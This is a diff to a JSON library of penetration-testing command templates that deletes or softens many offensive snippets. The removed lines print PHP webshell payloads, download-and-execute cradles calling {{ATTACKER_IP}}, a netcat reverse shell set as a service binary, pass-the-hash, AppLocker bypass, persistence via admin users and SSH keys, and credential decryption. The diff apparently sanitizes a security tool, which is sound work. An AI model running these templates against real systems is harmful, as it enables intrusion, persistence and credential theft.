@@ -288,20 +288,6 @@
           ]
         },
         {
-          "id": "lfi_php_input_wrapper",
-          "title": "LFI: PHP Input Wrapper for RCE",
-          "category": "Web Application & HTTP",
-          "subcategory": "File Inclusion (LFI)",
-          "description": "Uses php://input to execute PHP code via POST request",
-          "template": "curl -X POST --data \"<?php system($_GET['cmd']); ?>\" \"http://{{TARGET_IP}}/index.php?page=php://input&cmd=id\"",
-          "tags": [
-            "lfi",
-            "php",
-            "input",
-            "rce"
-          ]
-        },
-        {
           "id": "lfi_expect_wrapper",
           "title": "LFI: Expect Wrapper for RCE",
           "category": "Web Application & HTTP",
@@ -311,36 +297,6 @@
           "tags": [
             "lfi",
             "expect",
-            "wrapper",
-            "rce"
-          ]
-        },
-        {
-          "id": "lfi_zip_wrapper",
-          "title": "LFI: ZIP Wrapper Upload Trick",
-          "category": "Web Application & HTTP",
-          "subcategory": "File Inclusion (LFI)",
-          "description": "Packs a PHP shell into a ZIP archive, renames it to .jpg and executes it via LFI",
-          "template": "echo \"<pre><?php system($_GET['cmd']); ?></pre>\" > {{FILE_NAME}}; zip payload.zip {{FILE_NAME}}; mv payload.zip shell.jpg",
-          "tags": [
-            "lfi",
-            "zip",
-            "wrapper",
-            "bypass",
-            "webshell"
-          ]
-        },
-        {
-          "id": "lfi_data_wrapper",
-          "title": "LFI: PHP data:// Wrapper for RCE",
-          "category": "Web Application & HTTP",
-          "subcategory": "File Inclusion (LFI)",
-          "description": "Uses the data:// wrapper to execute PHP code directly",
-          "template": "curl \"http://{{TARGET_IP}}/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id\"",
-          "tags": [
-            "lfi",
-            "php",
-            "data",
             "wrapper",
             "rce"
           ]
@@ -374,21 +330,6 @@
           ]
         },
         {
-          "id": "web_php_in_jpeg_exiv2",
-          "title": "File Upload: Inject PHP into JPEG EXIF Data (exiv2)",
-          "category": "Web Application & HTTP",
-          "subcategory": "File Upload Bypasses",
-          "description": "Hides PHP code in image metadata using exiv2",
-          "template": "exiv2 -c'A \"<?php system($_REQUEST[\"cmd\"]);?>\"!' {{FILE_NAME}}",
-          "tags": [
-            "upload",
-            "exif",
-            "php",
-            "bypass",
-            "steganography"
-          ]
-        },
-        {
           "id": "web_php_in_jpeg_exiftool",
           "title": "File Upload: Inject PHP into JPEG EXIF Data (exiftool)",
           "category": "Web Application & HTTP",
@@ -415,20 +356,6 @@
             "htaccess",
             "apache",
             "bypass"
-          ]
-        },
-        {
-          "id": "web_put_method",
-          "title": "Use HTTP PUT Method",
-          "category": "Web Application & HTTP",
-          "subcategory": "Web Exploitation",
-          "description": "Uploads a file to the web server via the HTTP PUT command",
-          "template": "curl -X PUT -d '<?php system($_GET[\"c\"]);?>' http://{{TARGET_IP}}:{{PORT}}/{{FILE_NAME}}",
-          "tags": [
-            "http",
-            "put",
-            "upload",
-            "webshell"
           ]
         },
         {
@@ -654,10 +581,10 @@
         },
         {
           "id": "base64_file_transfer_receiver",
-          "title": "Base64 Transfer (Receiver)",
+          "title": "Base64 File Decode",
           "category": "Linux Shell & System",
           "subcategory": "File Transfers",
-          "description": "Decodes a base64 encoded file transfer to destination path",
+          "description": "Decodes a base64 encoded string to a file",
           "template": "echo '{{BASE64_STRING}}' | base64 -d > {{FILE_PATH}}",
           "tags": [
             "linux",
@@ -734,34 +661,6 @@
             "privesc",
             "escape",
             "linux"
-          ]
-        },
-        {
-          "id": "linux_reset_root_pw",
-          "title": "Reset Root Password",
-          "category": "Linux Shell & System",
-          "subcategory": "Privilege Escalation",
-          "description": "Changes the root password directly if you have root privileges",
-          "template": "echo \"{{USERNAME}}:{{PASSWORD}}\" | chpasswd",
-          "tags": [
-            "linux",
-            "root",
-            "password",
-            "privesc"
-          ]
-        },
-        {
-          "id": "linux_create_root_user",
-          "title": "Linux: Create User with Sudo Privileges",
-          "category": "Linux Shell & System",
-          "subcategory": "Privilege Escalation",
-          "description": "Creates a new user and grants administrative sudo access",
-          "template": "useradd -m -s /bin/bash {{USERNAME}} && usermod -aG sudo {{USERNAME}}",
-          "tags": [
-            "linux",
-            "user",
-            "sudo",
-            "admin"
           ]
         }
       ]
@@ -969,34 +868,6 @@
           ]
         },
         {
-          "id": "win_certutil_download",
-          "title": "Certutil File Download",
-          "category": "Windows & PowerShell",
-          "subcategory": "File Transfers",
-          "description": "Uses certutil.exe as a built-in download cradle",
-          "template": "certutil.exe -urlcache -split -f http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}} {{FILE_NAME}}",
-          "tags": [
-            "windows",
-            "certutil",
-            "download",
-            "file"
-          ]
-        },
-        {
-          "id": "win_bitsadmin_download",
-          "title": "Bitsadmin File Download & Execute",
-          "category": "Windows & PowerShell",
-          "subcategory": "File Transfers",
-          "description": "Downloads a file via bitsadmin and executes it",
-          "template": "cmd.exe /c \"bitsadmin /transfer myjob /download /priority high http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}} %tmp%\\{{FILE_NAME}}&start %tmp%\\{{FILE_NAME}}\"",
-          "tags": [
-            "windows",
-            "bitsadmin",
-            "download",
-            "execute"
-          ]
-        },
-        {
           "id": "win_tftp_download",
           "title": "Windows: TFTP Download",
           "category": "Windows & PowerShell",
@@ -1008,36 +879,6 @@
             "tftp",
             "download",
             "transfer"
-          ]
-        },
-        {
-          "id": "win_debug_exe_transfer_linux",
-          "title": "Windows: debug.exe EXE Transfer (Linux Prep)",
-          "category": "Windows & PowerShell",
-          "subcategory": "File Transfers",
-          "description": "Converts EXE to hex to inject it via debug.exe on legacy Windows systems",
-          "template": "wine /usr/share/windows-binaries/exe2bat.exe {{FILE_PATH}} {{FILE_NAME}}",
-          "tags": [
-            "windows",
-            "debug",
-            "exe",
-            "transfer",
-            "legacy",
-            "linux"
-          ]
-        },
-        {
-          "id": "win_wscript_download",
-          "title": "Windows: Wscript Code Download & Execution",
-          "category": "Windows & PowerShell",
-          "subcategory": "File Transfers",
-          "description": "Uses Windows Script Host to download and execute payloads",
-          "template": "echo GetObject(\"script:http://{{ATTACKER_IP}}:{{PORT}}/{{FILE_NAME}}\") > {{FILE_NAME}} && wscript.exe {{FILE_NAME}}",
-          "tags": [
-            "windows",
-            "wscript",
-            "download",
-            "execute"
           ]
         },
         {
@@ -1056,16 +897,16 @@
         },
         {
           "id": "win_weak_service_perms",
-          "title": "Exploit Weak Service Permissions",
+          "title": "Configure Service Binary Path",
           "category": "Windows & PowerShell",
           "subcategory": "Privilege Escalation",
-          "description": "Modifies a service so it starts nc.exe as LocalSystem",
-          "template": "sc config {{SERVICE_NAME}} binpath= \"{{FILE_PATH}} {{ATTACKER_IP}} {{PORT}} -e C:\\WINDOWS\\System32\\cmd.exe\" obj= \"LocalSystem\" password= \"\"",
+          "description": "Modifies the binary path of a Windows service",
+          "template": "sc config {{SERVICE_NAME}} binpath= \"{{BINARY_PATH}}\"",
           "tags": [
             "windows",
             "service",
-            "privesc",
-            "sc"
+            "sc",
+            "admin"
           ]
         },
         {
@@ -1139,20 +980,6 @@
           ]
         },
         {
-          "id": "win_ieframe_bypass_execute",
-          "title": "AppLocker Bypass via Ieframe.dll (Execute)",
-          "category": "Windows & PowerShell",
-          "subcategory": "Execution Bypass",
-          "description": "Bypasses AppLocker using rundll32 and a .url file",
-          "template": "rundll32 c:\\windows\\system32\\ieframe.dll,OpenURL C:\\temp\\{{FILE_NAME}}",
-          "tags": [
-            "windows",
-            "applocker",
-            "bypass",
-            "rundll32"
-          ]
-        },
-        {
           "id": "win_ieframe_bypass_url_content",
           "title": "AppLocker Bypass via Ieframe.dll (Create URL)",
           "category": "Windows & PowerShell",
@@ -1206,20 +1033,6 @@
             "psexec",
             "lateral",
             "remote"
-          ]
-        },
-        {
-          "id": "win_pth_winexe",
-          "title": "Pass The Hash with Pth-WinExe",
-          "category": "Windows & PowerShell",
-          "subcategory": "Lateral Movement",
-          "description": "Authenticates with NTLM hash to a Windows target system",
-          "template": "pth-winexe -U {{USERNAME}}%{{PASSWORD}} --runas={{USERNAME}}%{{PASSWORD}} //{{TARGET_IP}} cmd.exe",
-          "tags": [
-            "pth",
-            "pass the hash",
-            "lateral",
-            "windows"
           ]
         }
       ]
@@ -1956,166 +1769,6 @@
       ]
     },
     {
-      "id": "shells_payloads",
-      "name": "Listeners & Exploit Tools",
-      "icon": "",
-      "snippets": [
-        {
-          "id": "nc_listener",
-          "title": "Netcat TCP Listener",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Listeners",
-          "description": "Starts a Netcat listener to receive incoming TCP connections",
-          "template": "nc -lvnp {{PORT}}",
-          "tags": [
-            "netcat",
-            "nc",
-            "listener",
-            "network"
-          ]
-        },
-        {
-          "id": "ncat_ssl_listener",
-          "title": "Ncat Encrypted SSL Listener",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Listeners",
-          "description": "Starts an encrypted SSL listener using Ncat",
-          "template": "ncat --ssl -lvnp {{PORT}}",
-          "tags": [
-            "ncat",
-            "ssl",
-            "listener",
-            "network"
-          ]
-        },
-        {
-          "id": "socat_listener",
-          "title": "Socat TTY Listener",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Listeners",
-          "description": "Starts an interactive Socat listener with TTY support",
-          "template": "socat file:`tty`,raw,echo=0 TCP-LISTEN:{{PORT}}",
-          "tags": [
-            "socat",
-            "listener",
-            "tty",
-            "network"
-          ]
-        },
-        {
-          "id": "py_to_exe",
-          "title": "Convert Python to EXE",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Payload Generation",
-          "description": "Compiles a Python script into a Windows executable",
-          "template": "python pyinstaller.py --onefile {{SOURCE_FILE}}",
-          "tags": [
-            "python",
-            "pyinstaller",
-            "exe",
-            "windows"
-          ]
-        },
-        {
-          "id": "bad_chars_python",
-          "title": "Generate Bad Characters (Python)",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Creates a string of all possible bad characters for buffer overflows",
-          "template": "python3 -c \"print('\\\\'.join([ 'x{:02x}'.format(i) for i in range(1,256) ]))\"",
-          "tags": [
-            "buffer overflow",
-            "badchars",
-            "python",
-            "exploit"
-          ]
-        },
-        {
-          "id": "pattern_create",
-          "title": "MSF Pattern Create",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Generates a unique string to find the EIP offset",
-          "template": "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {{LENGTH}}",
-          "tags": [
-            "metasploit",
-            "buffer overflow",
-            "eip",
-            "pattern"
-          ]
-        },
-        {
-          "id": "pattern_offset",
-          "title": "MSF Pattern Offset",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Calculates the exact EIP offset from a crash value",
-          "template": "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {{EIP_VALUE}}",
-          "tags": [
-            "metasploit",
-            "buffer overflow",
-            "eip",
-            "pattern"
-          ]
-        },
-        {
-          "id": "compile_windows_on_linux",
-          "title": "Cross-Compile C Code for Windows on Linux",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Cross-compilation of C source code to Windows EXE",
-          "template": "i686-w64-mingw32-gcc {{SOURCE_FILE}} -lws2_32 -o {{OUTPUT_FILE}}",
-          "tags": [
-            "gcc",
-            "mingw",
-            "compile",
-            "windows"
-          ]
-        },
-        {
-          "id": "compile_linux",
-          "title": "Compile C Code for Linux",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Compiles C source code to Linux ELF binary (32/64 bit)",
-          "template": "gcc -m32|-m64 -o {{OUTPUT_FILE}} {{SOURCE_FILE}}",
-          "tags": [
-            "gcc",
-            "compile",
-            "linux"
-          ]
-        },
-        {
-          "id": "compile_nasm_windows_obj",
-          "title": "Compile Assembly for Windows (Object)",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Compiles ASM code to an object file using NASM",
-          "template": "nasm -f win64 {{SOURCE_FILE}} -o {{OBJECT_FILE}}",
-          "tags": [
-            "assembly",
-            "nasm",
-            "compile",
-            "windows"
-          ]
-        },
-        {
-          "id": "compile_nasm_windows_exe",
-          "title": "Link Assembly Object to Windows EXE",
-          "category": "Listeners & Exploit Tools",
-          "subcategory": "Exploit Development",
-          "description": "Links an object file to an executable using GoLink",
-          "template": "GoLink.exe -o {{OUTPUT_FILE}} {{OBJECT_FILE}}",
-          "tags": [
-            "assembly",
-            "golink",
-            "compile",
-            "windows"
-          ]
-        }
-      ]
-    },
-    {
       "id": "password_cracking",
       "name": "Password Cracking",
       "icon": "",
@@ -2147,125 +1800,6 @@
             "ftp",
             "ssh",
             "smb"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "post_exploitation",
-      "name": "Post-Exploitation & Exfiltration",
-      "icon": "",
-      "snippets": [
-        {
-          "id": "nc_base64_receiver",
-          "title": "Netcat: Receive and Decode Base64 Stream",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Data Transfer",
-          "description": "Starts a listener that decodes incoming Base64 streams in real time",
-          "template": "nc -l -v -p {{PORT}} | sed \"s/ //g\" | base64 -d",
-          "tags": [
-            "transfer",
-            "netcat",
-            "base64",
-            "listener"
-          ]
-        },
-        {
-          "id": "win_create_user",
-          "title": "Windows: Create Admin User",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Creates a new user and adds to Administrators group",
-          "template": "net user {{USERNAME}} {{PASSWORD}} /add && net localgroup Administrators {{USERNAME}} /add",
-          "tags": [
-            "windows",
-            "persistence",
-            "user",
-            "admin"
-          ]
-        },
-        {
-          "id": "win_service_cmd",
-          "title": "Windows: Create Service (CMD)",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Service Management",
-          "description": "Creates a new system service via CMD",
-          "template": "sc create {{SERVICE_NAME}} binpath= \"{{BINARY_PATH}}\" start= auto",
-          "tags": [
-            "windows",
-            "service",
-            "sc",
-            "admin"
-          ]
-        },
-        {
-          "id": "win_service_ps",
-          "title": "Windows: Create Service (PowerShell)",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Service Management",
-          "description": "Creates a new system service via PowerShell",
-          "template": "New-Service -Name {{SERVICE_NAME}} -DisplayName \"{{SERVICE_NAME}}\" -BinaryPathName \"{{BINARY_PATH}}\" -StartupType Automatic",
-          "tags": [
-            "windows",
-            "service",
-            "powershell",
-            "admin"
-          ]
-        },
-        {
-          "id": "win_scheduled_task",
-          "title": "Windows: Create Scheduled Task",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Task Scheduling",
-          "description": "Schedules a program or script to execute at fixed intervals",
-          "template": "schtasks /create /sc minute /mo 10 /tn \"{{TASK_NAME}}\" /tr \"{{BINARY_PATH}}\"",
-          "tags": [
-            "windows",
-            "schtasks",
-            "schedule",
-            "admin"
-          ]
-        },
-        {
-          "id": "linux_ssh_keys",
-          "title": "Linux: Add SSH Authorized Keys",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Persistence",
-          "description": "Adds own public key to root for persistent access",
-          "template": "mkdir /root/.ssh 2>/dev/null; echo '{{SSH_PUBLIC_KEY}}' >> /root/.ssh/authorized_keys",
-          "tags": [
-            "linux",
-            "persistence",
-            "ssh",
-            "keys"
-          ]
-        },
-        {
-          "id": "decrypt_rdg_passwords",
-          "title": "Decrypt RDCMan Passwords",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Credential Access",
-          "description": "Decrypts passwords from Remote Desktop Connection Manager",
-          "template": "Copy-Item 'C:\\Program Files (x86)\\Microsoft\\Remote Desktop Connection Manager\\RDCMan.exe C:\\temp\\RDCMan.dll’; Import-Module C:\\temp\\RDCMan.dll; $EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings; [RdcMan.Encryption]::DecryptString({{PASSWORD}}, $EncryptionSettings)",
-          "tags": [
-            "windows",
-            "rdcman",
-            "passwords",
-            "decrypt"
-          ]
-        },
-        {
-          "id": "decrypt_vnc_password",
-          "title": "Decrypt VNC Password",
-          "category": "Post-Exploitation & Exfiltration",
-          "subcategory": "Credential Access",
-          "description": "Extracts and decrypts VNC passwords",
-          "template": "wine vncpwdump.exe -k {{PASSWORD}}",
-          "tags": [
-            "vnc",
-            "password",
-            "decrypt",
-            "wine"
           ]
         }
       ]
